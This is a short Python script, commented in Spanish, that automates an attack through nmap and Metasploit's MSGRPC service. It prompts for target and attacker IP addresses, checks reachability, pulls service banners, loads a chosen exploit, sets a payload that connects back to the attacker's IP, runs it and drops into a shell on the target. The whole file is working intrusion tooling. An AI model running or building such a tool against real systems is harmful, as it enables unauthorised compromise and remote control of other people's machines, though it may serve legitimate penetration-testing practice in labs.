# __Libraties__ # 
from toolPrint import *
from toolNmap import *
from toolMetasploit import *
from toolPing import *
import os

# __Main Script__ #
# Iniciemos los objetos nmap y metasploit:
nmap = nmapTool()
# Información del servicio MSGRPC:
password = input('[+] Introduce el Passwrod del servicio MSGRPC (por defecto password):\n>>> ')
port = input('[+] Introduce el puerto del servicio MSGRPC (por defecto 55552):\n>>> ')
# dependiendo de la infromacion proporcionada:
if password == '' and port == '':
    metasploit = metasploitTool()
elif password != '' and port == '':
    metasploit = metasploitTool(password=password)
elif password == '' and port != '':
    metasploit = metasploitTool(port=port)
else:
    metasploit = metasploitTool(password=password, port=port)
# Obtengamos primero las IPs
# IP objetivo:
t_ip = input('[+] Introduce la IP de la maquina OBJETIVO:\n>>> ')
print('\n')
# IP atacante:
a_ip = input('[+] Introduce la IP de la maquina Atacante:\n>>> ')
print('\n')
#comprobamos que hay ambas maquinas se ven:
r0 = int(t_ip.split('.')[-1])
rf =  r0+1
if ping(t_ip, r0, rf, ver=True):
    os.system('clear')
    view = input('[+] Desea ver los banners de la maquina objetivo? (S/n)\n>>> ').lower()
    print('\n')
    if view == 's':
        # obtengamos infromacion acerca de la maquina objetivo:
        print('[*] Getting banners...')
        listPrint(nmap.getBanners(t_ip, to_screen=False, to_var=True))
        print('\n[+] En funcion de los Banners Mostrados,')
    # Establecemos el exploit
    exploit = input('[+] Introduce el exploit que desea emplear:\n>>> ') 
    print('\n')
    # configuramos el exploit
    if not exploit == '':
        metasploit.set_exploit(t_ip=t_ip, exploit=exploit)
    else:
        metasploit.set_exploit(t_ip=t_ip)
    # seleccionamos el Payload
    payloads = metasploit.print_payloads(to_var=True)
    for payload in payloads:
        print(f'[{payloads.index(payload)}]\t{payload}')
    p = int(input('\n[+] Seleccione el indice del payload a emplear:\n>>> '))
    # configuramos el payload
    metasploit.set_payload(a_ip=a_ip, payload=payloads[p])
    #ejecutamos el payload
    metasploit.runPayload()
    #ejecutamos comandos en la shell de la maquina objetivo
    metasploit.use_shell(metasploit.selectSession())